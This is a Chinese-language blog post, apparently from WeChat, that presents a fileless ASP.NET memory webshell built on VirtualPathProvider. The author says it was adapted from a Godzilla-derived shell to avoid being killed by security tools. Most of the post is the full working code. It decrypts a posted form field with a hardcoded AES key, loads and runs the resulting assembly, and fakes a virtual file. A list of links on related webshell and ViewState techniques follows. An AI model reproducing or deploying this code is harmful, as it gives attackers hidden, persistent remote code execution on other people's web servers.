### VirtualPath

实际使用中发现报错，但哥斯拉派生的内存马可以但是会被杀，逆向dll发现使用virtualpath的方式，并存在通过反射绕过frendlyurl和预编译代码

  

![]()

  

![]()

  

于是根据据实际环境修改内存马如下

  

    
    
    <%@ Import Namespace="System.Diagnostics" %>  
    <%@ Import Namespace="System.IO" %>  
    <%@ Import Namespace="System.Security.Cryptography" %>  
    <%@ Import Namespace="System.Web.Hosting" %>  
    <script runat="server" language="c#">  
        public void Page_load()  
        {  
            var buildManagerType = typeof(System.Web.Compilation.BuildManager);  
            var debugProp = buildManagerType.GetProperty("DebuggingEnabled",  
                System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);  
            Console.WriteLine(debugProp);  
            if (debugProp != null)  
            {  
                debugProp.SetValue(null, true);  
            }  
            HostingEnvironment.RegisterVirtualPathProvider(new MyVirtualPathProvider());  
        }  
        public class MyVirtualPathProvider : VirtualPathProvider  
        {  
            public override string GetCacheKey(string virtualPath)  
            {  
                try  
                {  
                    HttpContext context = HttpContext.Current;  
                    String Payload = context.Request.Form["ant"];  
                    if (Payload != null)  
                    {  
                        string aesKey = "ewtk7fiw26osz2gi";  
                        var utf8 = new UTF8Encoding();  
                        var b64Dec = new FromBase64Transform();  
                        var aes = new RijndaelManaged();  
                        aes.Padding = (PaddingMode)3;  
                        aes.KeySize = 128;  
                        var aesKeyBytes = utf8.GetBytes(aesKey);  
                        aes.IV = aesKeyBytes;  
                        var cipherBytes = b64Dec.TransformFinalBlock((utf8.GetBytes(Payload)), 0, utf8.GetBytes(Payload).Length);  
                        var aesDec = aes.CreateDecryptor((aesKeyBytes), (aes.IV));  
                        var plainBytes = aesDec.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);  
                        var res = utf8.GetString(plainBytes).TrimEnd('\0').TrimEnd(null);  
                        int test1 = res.Length;  
                        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(res));  
                        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);  
                        context.Response.End();  
                    }  
                      
                }  
                catch (Exception e)  
                {  
                    Console.WriteLine(e);  
                }  
                return Previous.GetCacheKey(virtualPath);  
            }  
      
            public override bool FileExists(string virtualPath)  
            {  
                virtualPath = virtualPath.ToLower();  
      
                if (virtualPath.Contains("indexcc"))  
                {  
                    return true;  
                }  
                else  
                {  
                    return Previous.FileExists(virtualPath);  
                }  
                //return base.FileExists(virtualPath);  
            }  
      
            public override VirtualFile GetFile(string virtualPath)  
            {  
                virtualPath = virtualPath.ToLower();  
      
                if (virtualPath.Contains("indexcc"))  
                {  
                    return new MyVirtualFile(virtualPath);  
                }  
                else  
                {  
                    return Previous.GetFile(virtualPath);  
                }  
                //return base.GetFile(virtualPath);  
            }  
      
      
        }  
      
      
        public class MyVirtualFile : VirtualFile  
        {  
            private string myPath;  
            public MyVirtualFile(string virtualPath)  
                : base(virtualPath)  
            {  
                myPath = virtualPath;  
            }  
      
      
            public override Stream Open()  
            {  
                Stream stream = new MemoryStream();  
                return stream;  
            }  
        }  
      
    </script>  
    

## 参考文章

https://yzddmr6.com/archives/ 蚁剑作者

http://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html
头像哥博客 listener

https://mp.weixin.qq.com/s?__biz=MzkzNTI4NjU1Mw==&mid=2247483945&idx=1&sn=f4ad81298b17f2925c95ea1d69edede9&chksm=c2b1005ff5c68949da993b44f4d9f3c1d070673c1b08130edc008e27bd10e2ed718c889604c4&scene=21#wechat_redirect

腾讯AD实验室 listener

https://paper.seebug.org/1386/ ViewState

https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-
create-fileless-webshell/ ViewState

https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-
sessionstate/ sessionstate

https://blog.wanghw.cn/security/dotnet-viewstate-no-file-godzilla-
memshell.html#devco-blog ViewState

http://paper.vulsee.com/KCon/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf
virtualPath

https://y4er.com/posts/aspnet-getshell-tips/ appcmd

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-
Webshell VirtualPathProvider

https://www.crisprx.top/archives/547 filter

https://blog.wanghw.cn/security/dotnet-viewstate-no-file-godzilla-
memshell.html viewstate

https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-
execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
viewstate

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

